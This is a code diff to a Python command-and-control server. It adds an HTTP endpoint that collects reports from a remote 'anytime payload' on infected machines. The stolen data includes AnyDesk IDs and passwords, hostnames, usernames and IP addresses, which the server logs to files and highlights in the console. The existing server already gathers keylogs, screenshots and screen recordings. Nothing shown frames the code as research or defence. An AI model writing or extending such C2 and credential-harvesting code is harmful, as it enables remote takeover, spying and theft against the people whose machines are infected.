@@ -1,13 +1,17 @@
 #!/usr/bin/env python3
 """
-TCP Command Sender
+TCP Command Sender (Enhanced - Dual Purpose C2)
 This program listens for incoming connections and sends commands to execute.
+Now also receives HTTP reports from anytime payload.
 """
 
 import os
 import socket
 import sys
+import json
+import threading
 from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from tqdm import tqdm
 
 # Import from utils modules
@@ -16,7 +20,14 @@ from utils.protocol import receive_text, receive_binary, peek_for_binary
 
 
 # Ensure data directories exist
-DATA_DIRS = ["data", "data/keylogs", "data/screenshots", "data/snapshots", "data/screenrecordings"]
+DATA_DIRS = [
+    "data",
+    "data/keylogs",
+    "data/screenshots",
+    "data/snapshots",
+    "data/screenrecordings",
+    "data/anytime_reports",
+]
 
 for dir_path in DATA_DIRS:
     os.makedirs(dir_path, exist_ok=True)
@@ -322,7 +333,138 @@ def handle_response(client_socket, command):
                 print()
 
 
-def start_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
+class AnytimeReportHandler(BaseHTTPRequestHandler):
+    """HTTP request handler for anytime payload reports"""
+
+    def log_message(self, format, *args):
+        """Suppress default HTTP server logging"""
+        pass
+
+    def do_POST(self):
+        """Handle POST requests to /report endpoint"""
+        if self.path == "/report":
+            try:
+                # Read and parse request body
+                content_length = int(self.headers.get("Content-Length", 0))
+                body = self.rfile.read(content_length)
+                data = json.loads(body.decode("utf-8"))
+
+                # Log the report
+                self.log_anydesk_report(data)
+
+                # Send success response
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                self.wfile.write(b"OK")
+
+            except Exception as e:
+                print(f"\n[HTTP ERROR] Failed to process report: {e}")
+                self.send_response(500)
+                self.end_headers()
+        else:
+            # 404 for any other path
+            self.send_response(404)
+            self.end_headers()
+
+    def log_anydesk_report(self, data):
+        """Log AnyDesk access report to files and display in console"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # Extract all fields from report
+        anydesk_id = data.get("id", "UNKNOWN")
+        password = data.get("password", "UNKNOWN")
+        hostname = data.get("hostname", "UNKNOWN")
+        username = data.get("username", "UNKNOWN")
+        execution_time = data.get("execution_time", "N/A")
+        os_version = data.get("os_version", "N/A")
+        timezone = data.get("timezone", "N/A")
+        timezone_offset = data.get("timezone_offset", "N/A")
+        locale = data.get("locale", "N/A")
+        local_ip = data.get("local_ip", "N/A")
+        external_ip = data.get("external_ip", "N/A")
+
+        # Build complete report object
+        report = {
+            "timestamp": timestamp,
+            "anydesk_id": anydesk_id,
+            "password": password,
+            "hostname": hostname,
+            "username": username,
+            "os_version": os_version,
+            "timezone": timezone,
+            "timezone_offset": timezone_offset,
+            "locale": locale,
+            "local_ip": local_ip,
+            "external_ip": external_ip,
+            "execution_time": execution_time,
+            "source_ip": self.client_address[0],
+        }
+
+        # Save individual JSON report
+        report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        report_file = f"data/anytime_reports/{report_filename}"
+        with open(report_file, "w") as f:
+            json.dump(report, f, indent=2)
+
+        # Append to master log
+        with open("data/anytime_reports/master_log.txt", "a") as f:
+            f.write(f"\n{'='*70}\n")
+            f.write(f"[{timestamp}] NEW ANYDESK ACCESS\n")
+            f.write(f"{'='*70}\n")
+            f.write(f"AnyDesk ID:  {anydesk_id}\n")
+            f.write(f"Password:    {password}\n")
+            f.write(f"\n")
+            f.write(f"SYSTEM:\n")
+            f.write(f"  Hostname:    {hostname}\n")
+            f.write(f"  Username:    {username}\n")
+            f.write(f"  OS:          {os_version}\n")
+            f.write(f"\n")
+            f.write(f"LOCATION:\n")
+            f.write(f"  Timezone:    {timezone} (UTC{timezone_offset:+})\n")
+            f.write(f"  Locale:      {locale}\n")
+            f.write(f"  Local IP:    {local_ip}\n")
+            f.write(f"  External IP: {external_ip}\n")
+            f.write(f"\n")
+            f.write(f"PERFORMANCE:\n")
+            f.write(f"  Exec Time:   {execution_time}s\n")
+            f.write(f"  Source IP:   {self.client_address[0]}\n")
+            f.write(f"\n")
+
+        # Display prominently in console
+        print(f"\n{'='*70}")
+        print(f"🎯 NEW ANYDESK ACCESS REPORTED!")
+        print(f"{'='*70}")
+        print(f"  AnyDesk ID:  \033[1;32m{anydesk_id}\033[0m")
+        print(f"  Password:    \033[1;32m{password}\033[0m")
+        print(f"")
+        print(f"  SYSTEM:")
+        print(f"    Hostname:    {hostname}")
+        print(f"    Username:    {username}")
+        print(f"    OS:          {os_version}")
+        print(f"")
+        print(f"  LOCATION:")
+        print(f"    Timezone:    {timezone} (UTC{timezone_offset:+})")
+        print(f"    Locale:      {locale}")
+        print(f"    Local IP:    {local_ip}")
+        print(f"    External IP: {external_ip}")
+        print(f"")
+        print(f"  PERFORMANCE:")
+        print(f"    Exec Time:   {execution_time}s")
+        print(f"    Source IP:   {self.client_address[0]}")
+        print(f"{'='*70}")
+        print(f"  Saved to: {report_file}")
+        print(f"{'='*70}\n")
+
+
+def start_http_server(host, port):
+    """Start HTTP server for anytime payload reports"""
+    server = HTTPServer((host, port), AnytimeReportHandler)
+    print(f"HTTP server listening on {host}:{port}")
+    server.serve_forever()
+
+
+def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
     """
     Start the TCP command sender server.
 
@@ -402,5 +544,16 @@ def start_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
 
 
 if __name__ == "__main__":
-    print("\n[ TCP Command Sender ]\n")
-    start_sender(DEFAULT_HOST, DEFAULT_PORT)
+    print("\n[ Enhanced C2 Server - Dual Purpose ]\n")
+    print("Modes:")
+    print("  1. TCP Server  (port 5555) - receiver.py connections")
+    print("  2. HTTP Server (port 8080) - anytime payload reports")
+    print()
+
+    # Start HTTP server in background thread
+    http_thread = threading.Thread(target=start_http_server, args=("0.0.0.0", 8080), daemon=True)
+    http_thread.start()
+
+    # Start TCP server in main thread
+    print("[ TCP Server Starting... ]\n")
+    start_tcp_sender(DEFAULT_HOST, DEFAULT_PORT)
